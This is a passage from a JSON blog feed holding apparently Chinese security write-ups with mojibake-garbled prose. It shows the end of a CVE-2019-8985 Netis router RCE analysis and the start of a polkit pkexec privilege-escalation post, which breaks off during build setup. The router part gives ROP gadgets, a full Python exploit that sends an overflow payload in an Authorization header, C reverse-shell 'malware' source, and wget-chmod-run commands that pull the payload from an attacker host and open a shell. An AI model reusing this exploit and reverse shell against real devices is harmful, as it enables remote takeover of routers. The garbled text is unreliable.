é‚£ä¹ˆè¿™é‡Œ + ä¸Š <code>0x1c</code>  çš„åœ°æ–¹å¯ä»¥å¸ƒç½®ä¸‹ä¸€ä¸ª rop å¹¶æŠŠ sp åŠ ä¸Šæ¥</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.init:000017A4                 lw      $ra, 0x1C+var_s0($sp)</span><br><span class=\"line\">.init:000017A8                 nop</span><br><span class=\"line\">.init:000017AC                 jr      $ra</span><br><span class=\"line\">.init:000017B0                 addiu   $sp, 0x20</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget4\"><a class=\"markdownIt-Anchor\" href=\"#gadget4\">#</a> gadget4</h3>\n<p>æœ€å é€šè¿‡ sp åŠ ä¸Š <code>0x18</code>  çš„ä½ç½®å°† sp å›å¤åˆ°ä¹‹å‰çš„ sp ä¸€æ ·çš„åœ°å€ å¹¶ jalr åˆ° s3</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8</span><br><span class=\"line\">.text:0000ABD4                 move    $a1, $s2</span><br><span class=\"line\">.text:0000ABD8                 move    $s0, $zero</span><br><span class=\"line\">.text:0000ABDC                 move    $t9, $s3</span><br><span class=\"line\">.text:0000ABE0                 jalr    $t9</span><br><span class=\"line\">.text:0000ABE4                 movz    $s0, $v0, $v1</span><br></pre></td></tr></table></figure>\n<h3 id=\"æµç¨‹å›¾\"><a class=\"markdownIt-Anchor\" href=\"#æµç¨‹å›¾\">#</a> æµç¨‹å›¾</h3>\n<p><img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/liucheng.png\" alt></p>\n<h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">context(arch = <span class=\"string\">&quot;mips&quot;</span>, endian = <span class=\"string\">&quot;big&quot;</span>, os = <span class=\"string\">&quot;Linux&quot;</span>, log_level = <span class=\"string\">&quot;DEBUG&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc \t   = <span class=\"number\">0x77f2e000</span> </span><br><span class=\"line\">libgcc \t= <span class=\"number\">0x77ee2000</span></span><br><span class=\"line\">system\t= <span class=\"number\">0x0002AC90</span> + libc</span><br><span class=\"line\">gadgets  = [<span class=\"number\">0</span> ,<span class=\"number\">0x00008B20</span> ,<span class=\"number\">0x00020650</span> ,<span class=\"number\">0x000017A4</span> ,<span class=\"number\">0x0000ABD0</span>]</span><br><span class=\"line\">MAXSZ\t   = <span class=\"number\">1024</span></span><br><span class=\"line\">cmd\t\t= <span class=\"string\">b&quot;echo &#x27;hacked&#x27; &gt; CrimeStatement&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\trop = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x: x + libgcc,gadgets))</span><br><span class=\"line\">\trop[<span class=\"number\">2</span>] = rop[<span class=\"number\">2</span>] - libgcc + libc</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] rop[<span class=\"subst\">&#123;i&#125;</span>] is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(rop[i])&#125;</span>&quot;</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] system is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpayload  = <span class=\"string\">b&#x27;a:%s&#x27;</span> %(<span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x3C</span> - <span class=\"number\">2</span>))</span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">4</span>])\t\t\t\t\t<span class=\"comment\"># </span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">3</span>])\t\t\t\t\t<span class=\"comment\"># s0</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;AAAA&#x27;</span>\t\t\t\t\t\t<span class=\"comment\"># s1 </span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;CCCC&#x27;</span> \t\t\t\t\t\t<span class=\"comment\"># s2</span></span><br><span class=\"line\">\tpayload += p32(system)\t\t\t\t\t<span class=\"comment\"># s3</span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">2</span>])\t\t\t\t\t<span class=\"comment\"># s4</span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">1</span>])\t\t\t\t\t<span class=\"comment\"># ra</span></span><br><span class=\"line\">\tpayload += cmd</span><br><span class=\"line\"></span><br><span class=\"line\">\theader   = <span class=\"string\">b&#x27;GET / HTTP/1.1\\r\\n&#x27;</span></span><br><span class=\"line\">\t<span class=\"comment\"># header  += b&#x27;Host: 127.0.0.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Host: 10.10.10.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Authorization: Basic %s\\r\\n&#x27;</span> % base64.b64encode(payload)</span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;User-Agent: Real UserAgent\\r\\n\\r\\n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">\tiport = (<span class=\"string\">&quot;10.10.10.1&quot;</span> ,<span class=\"number\">80</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># iport = (&quot;127.0.0.1&quot; ,80)</span></span><br><span class=\"line\">\ts.connect(iport)</span><br><span class=\"line\">\ts.send(header)</span><br><span class=\"line\">\tmsg = s.recv(MAXSZ)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Message is %s&quot;</span> %(msg))</span><br><span class=\"line\">\ts.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\texp()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719174740.png\" alt></p>\n<h2 id=\"åšç‚¹åäº‹\"><a class=\"markdownIt-Anchor\" href=\"#åšç‚¹åäº‹\">#</a> åšç‚¹åäº‹</h2>\n<p>æ—¢ç„¶éƒ½æ‹¿ä¸‹äº†è¿™ä¹ˆé•¿çš„ cmd<br>\n é‚£ä¹ˆä¸åšç‚¹åäº‹ä¹Ÿè¯´ä¸è¿‡å»<br>\n busybox ä¸­æ²¡æœ‰ <code>nc</code>  ä¹Ÿæ²¡æœ‰ <code>bash -i</code>  ä¹‹ç±»çš„ä¸œè¥¿ç»™æˆ‘ä»¬åšåå‘ shell</p>\n<p>ä½†æ˜¯æœ‰ <code>wget</code>  ä¸‹è½½æ¶æ„ç¨‹åºå¹¶è¿è¡Œ</p>\n<p>ç¼–å†™æ¶æ„ç¨‹åº <code>malware</code>  (âœ¨TODO ä¿®æ”¹å‚æ•°)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;netinet/in.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> port = atoi(argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"type\">char</span>* ip = argv[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"type\">int</span> sd = socket(AF_INET, SOCK_STREAM, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> <span class=\"title\">sin</span> =</span> &#123;</span><br><span class=\"line\">\t\t.sin_family = AF_INET,</span><br><span class=\"line\">\t\t.sin_port = htons(port),</span><br><span class=\"line\">\t\t.sin_addr.s_addr = inet_addr(ip),</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tconnect(sd, (<span class=\"keyword\">struct</span> sockaddr *)&amp;<span class=\"built_in\">sin</span>, <span class=\"keyword\">sizeof</span>(<span class=\"built_in\">sin</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> _ = <span class=\"number\">0</span>; _ &lt;= <span class=\"number\">2</span>; _++) </span><br><span class=\"line\">\t\tdup2(sd, _);</span><br><span class=\"line\">\texecl(<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mips-linux-gnu-gcc -static -mabi=32 -o malware malware.c</span><br></pre></td></tr></table></figure>\n<p>æˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸¤æ¬¡æ¼æ´ ä¸€æ¬¡è®© malware å¯æ‰§è¡Œ ä¸€æ¬¡è®©å…¶è·‘èµ·æ¥ï¼ˆå› ä¸ºé•¿åº¦ä¸å¤Ÿ æ²¡æ³•ä¸€æ¬¡æ€§è§£å†³ï¼‰</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://10.10.10.2:8000/malware</span><br><span class=\"line\">chmod +x malware</span><br><span class=\"line\">./malware 10.10.10.2 9999</span><br></pre></td></tr></table></figure>\n<p>æ”»å‡»æœºå¼€å¯ç›‘å¬<br>\næ•ˆæœå¦‚ä¸‹ æˆåŠŸ getshell<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719182949.png\" alt></p>\n<h2 id=\"æœªå®Œ\"><a class=\"markdownIt-Anchor\" href=\"#æœªå®Œ\">#</a> æœªå®Œ</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">âœ  squrootfs grep -r &quot;Authorization: Basic &quot; .</span><br><span class=\"line\">Binary file ./bin/updatedd matches</span><br><span class=\"line\">Binary file ./bin/busybox matches</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission denied</span><br><span class=\"line\">âœ  squrootfs grep -r &quot;User-Agent: Real UserAgent&quot; .</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission denied</span><br><span class=\"line\">âœ  squrootfs grep -r &quot;User-Agent: &quot; .              </span><br><span class=\"line\">Binary file ./bin/updatedd matches</span><br><span class=\"line\">Binary file ./bin/busybox matches</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "IoT"
            ]
        },
        {
            "id": "https://squirre17.github.io/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/",
            "url": "https://squirre17.github.io/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/",
            "title": "CVE-2021-4030 polkit-pkexec æœ¬åœ°ææƒåˆ†æ",
            "date_published": "2021-08-10T16:00:00.000Z",
            "content_html": "<h2 id=\"å‚è€ƒ\"><a class=\"markdownIt-Anchor\" href=\"#å‚è€ƒ\">#</a> å‚è€ƒ</h2>\n<ul>\n<li><a href=\"https://bbs.pediy.com/thread-271423.htm\">çœ‹é›ªå¤§çˆ¹</a></li>\n<li><a href=\"https://trganda.github.io/posts/iconv/\">GCONV_PATH åˆ©ç”¨</a></li>\n<li><a href=\"https://blog.csdn.net/qq_42303523/article/details/117911859#:~:text=linux%E7%B3%BB%E7%BB%9F%E6%8F%90,%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%BC%9A%E5%A6%82%E4%B8%8B%EF%BC%9A\">GCONV_PATH åˆ©ç”¨ 2</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/470224218?utm_source=qq&amp;utm_medium=social&amp;utm_oi=949109417673797632\">åˆå¤©</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s?__biz=Mzg2MTY0MDc1Mw==&amp;mid=2247484520&amp;idx=1&amp;sn=b9fdfa0c5cc802478a541964a0d5b2c2&amp;chksm=ce154536f962cc20db00097e2b0f4cc155aefb25e54dbc31af29733be6ecf9ba21d3fd77b908&amp;mpshare=1&amp;scene=23&amp;srcid=0301ZZXX7YvmTLBFW02HGXd5&amp;sharer_sharetime=1646130648823&amp;sharer_shareid=35c6bdd49b9ea011edbc171a217d1072#rd\">å¤©ç„å®éªŒå®¤</a></li>\n<li><a href=\"https://www.anquanke.com/post/id/267774#h3-2\">å®‰å…¨å®¢</a></li>\n<li><a href=\"https://www.wt37.cn/5949.html\">å°‘ç¾½</a></li>\n</ul>\n<h2 id=\"è½¯ä»¶ç®€ä»‹\"><a class=\"markdownIt-Anchor\" href=\"#è½¯ä»¶ç®€ä»‹\">#</a> è½¯ä»¶ç®€ä»‹</h2>\n<p><a href=\"https://gitlab.freedesktop.org/polkit/polkit/\">https://gitlab.freedesktop.org/polkit/polkit/</a></p>\n<blockquote>\n<p>polkit is a toolkit for defining and handling authorizations. It is used for allowing unprivileged processes to speak to privileged processes.</p>\n</blockquote>\n<p>pkexec æ˜¯ polkit æ˜¯ä¸€ä¸ªç¨‹åºï¼Œpolkit è´Ÿè´£ä¸åŒç‰¹æƒçº§çš„è¿›ç¨‹é—´çš„é€šè®¯<br>\n <code>pkexec echo &quot;1&quot;</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --help</span><br><span class=\"line\">pkexec --version |</span><br><span class=\"line\">       --help |</span><br><span class=\"line\">       --disable-internal-agent |</span><br><span class=\"line\">       [--user username] PROGRAM [ARGUMENTS...]</span><br><span class=\"line\"></span><br><span class=\"line\">See the pkexec manual page for more details.</span><br></pre></td></tr></table></figure>\n<h2 id=\"ç¯å¢ƒ\"><a class=\"markdownIt-Anchor\" href=\"#ç¯å¢ƒ\">#</a> ç¯å¢ƒ</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --version</span><br><span class=\"line\">pkexec version 0.105</span><br><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ uname -a</span><br><span class=\"line\">Linux squ-virtual-machine 5.11.0-46-generic #51~20.04.1-Ubuntu SMP Fri Jan 7 06:51:40 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>\n<p>dockerï¼š<br>\npull ä¸ª debian ä¸‹æ¥ï¼Œç„¶åè®¾ç½®å…±äº«å·</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it --name=de -v /home/squ/docker_volumn:/home/vol debian /bin/bash</span><br></pre></td></tr></table></figure>\n<h2 id=\"ä¸‹è½½æºç \"><a class=\"markdownIt-Anchor\" href=\"#ä¸‹è½½æºç \">#</a> ä¸‹è½½æºç </h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/cve/policykit-1-0.105$ dpkg -S /usr/bin/pkexec</span><br><span class=\"line\">policykit-1: /usr/bin/pkexec</span><br></pre></td></tr></table></figure>\n<p><code>dpkg</code>  æŸ¥çœ‹åŒ…ä¸º <code>policykit-1</code> <br>\n <code>sudo apt source policykit-1</code>  æˆ–è€…<br>\n<a href=\"https://launchpad.net/ubuntu/bionic/+package/policykit-1\"> https://launchpad.net/ubuntu/bionic/+package/policykit-1</a><br>\n å½±å“ç‰ˆæœ¬ <code>0~0.105</code></p>\n<p>ä¸‹è½½åè·¯å¾„åœ¨ <code>/home/squ/Desktop/cve/policykit-1-0.105/src/programs/pkexec.c</code></p>\n<h2 id=\"ç¯å¢ƒæ­å»º\"><a class=\"markdownIt-Anchor\" href=\"#ç¯å¢ƒæ­å»º\">#</a> ç¯å¢ƒæ­å»º</h2>\n<p>æºç åœ°å€<br>\n<a href=\"https://gitlab.freedesktop.org/polkit/polkit\"> https://gitlab.freedesktop.org/polkit/polkit</a><br>\n åŸºæœ¬æ‰¾ä¸ªè™šæ‹Ÿæœºå°±èƒ½æ‰“ï¼ŒçœŸæ˜¯å¤ª coooooooooooooooooooooooooooool äº†<br>\n docker<br>\n å¦‚æœé‡åˆ°äº† <code>hash mismatch</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">E: Failed to fetch http:<span class=\"comment\">//deb.debian.org/debian/pool/main/b/binutils/binutils-common_2.35.2-2_amd64.deb  Hash Sum mismatch</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get clean  </span><br><span class=\"line\">apt-get update --fix-missing </span><br></pre></td></tr></table></figure>\n<p>å¦‚æœè¿˜æ˜¯ä¸è¡Œå°±æ¢æº <code>/etc/apt/sources.list</code> (debian)<br>\n å†ä¸è¡Œå°±å…³ä»£ç†å§ï¼ˆå…³äº†å°±å¥½äº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span></span><br><span class=\"line\">deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>é‡Œé¢æœ‰ä¸€ä¸ª <code>INSTALL</code>  çš„æ–‡ä»¶</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install libc6-dev</span><br><span class=\"line\">apt install gobjc++</span><br><span class=\"line\">./configure CC=c99 CFLAGS=-g LIBS=-lposix</span><br></pre></td></tr></table></figure>\n<p>é‡åˆ°é—®é¢˜</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking whether the C compiler works... no</span><br><span class=\"line\">configure: error: in `/home/vol/policykit<span class=\"number\">-1</span><span class=\"number\">-0.105&#x27;</span>:</span><br><span class=\"line\">configure: error: C compiler cannot create executables</span><br></pre></td></tr></table></figure>\n<p>çœ‹ <code>config.log</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure:<span class=\"number\">3355</span>: $? = <span class=\"number\">1</span></span><br><span class=\"line\">configure:<span class=\"number\">3375</span>: checking whether the C compiler works</span><br><span class=\"line\">configure:<span class=\"number\">3397</span>: /usr/bin/gcc -g   conftest.c -lposix &gt;&amp;<span class=\"number\">5</span></span><br><span class=\"line\">/usr/bin/ld: cannot find -lposix</span><br><span class=\"line\">collect2: error: ld returned <span class=\"number\">1</span> <span class=\"built_in\">exit</span> status</span><br></pre></td></tr></table></figure>\n<p>å®‰è£…åº“</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install manpages-posix-dev\t</span><br></pre></td></tr></table></figure>\n<p>ä¹Ÿæ²¡ç”¨ï¼Œç´¢æ€§ä¸åŠ  <code>posix</code>  è¯•è¯•çœ‹</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure CC=c99 CFLAGS=-g <span class=\"comment\">//LIBS=-lposix</span></span><br></pre></td></tr></table></figure>\n<p>ç»§ç»­æŠ¥é”™</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure: error: The pkg-config script could not be found or is too old.  Make sure it</span><br><span class=\"line\">is in your PATH or <span class=\"built_in\">set</span> the PKG_CONFIG environment variable to the full</span><br><span class=\"line\">path to pkg-config.</span><br></pre></td></tr></table></figure>\n<p>å®‰è£…</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y pkg-config</span><br></pre></td></tr></table></figure>\n<p>ç»§ç»­æŠ¥é”™</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure: error: Package requirements (gio-2.0 &gt;= 2.28.0) were not met:</span><br><span class=\"line\"></span><br><span class=\"line\">No package &#x27;gio-2.0&#x27; found</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y gio-2.0</span><br></pre></td></tr></table></figure>\n<p>ç„¶ååˆæ¥</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/bin/ld: cannot find -lpam</span><br></pre></td></tr></table></figure>\n<p>è¿™æ˜¯å› ä¸ºç¼ºå°‘ <code>libpam.so</code>  çš„åº“ï¼Œåœ¨ debian ç³»ç»Ÿä¸Šï¼Œå¯ä»¥è¿™æ ·ä¸‹è½½  <code>lib + id-dev</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y libpam-dev</span><br></pre></td></tr></table></figure>\n<p>ç»§ç»­æŠ¥é”™</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking <span class=\"keyword\">for</span> intltool &gt;= <span class=\"number\">0.40</span><span class=\"number\">.0</span>...  found</span><br><span class=\"line\">configure: error: Your intltool is too old.  You need intltool <span class=\"number\">0.40</span><span class=\"number\">.0</span> or later.</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install intltool</span><br></pre></td></tr></table></figure>\n<p>configure æ²¡é—®é¢˜äº† make æ¥äº†</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">polkitagentsession.c:<span class=\"number\">58</span>:<span class=\"number\">10</span>: fatal error: gio/gunixoutputstream.h: No such file or directory</span><br><span class=\"line\">   <span class=\"number\">58</span> | <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;gio/gunixoutputstream.h&gt;</span></span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install libglib2.0</span><br><span class=\"line\">apt-get install libgio2.0</span><br></pre></td></tr></table></figure>\n<p>è¿˜æ˜¯æ²¡ç”¨<br>\nå‘ç° <code>gio-unix-2.0*</code>  ä¸‹é¢å°±æ˜¯ <code>gio</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> -r /usr/include/gio-unix-2.0/gio/ /usr/include/</span><br></pre></td></tr></table></figure>\n<h2 id=\"åŸç†åˆ†æ\"><a 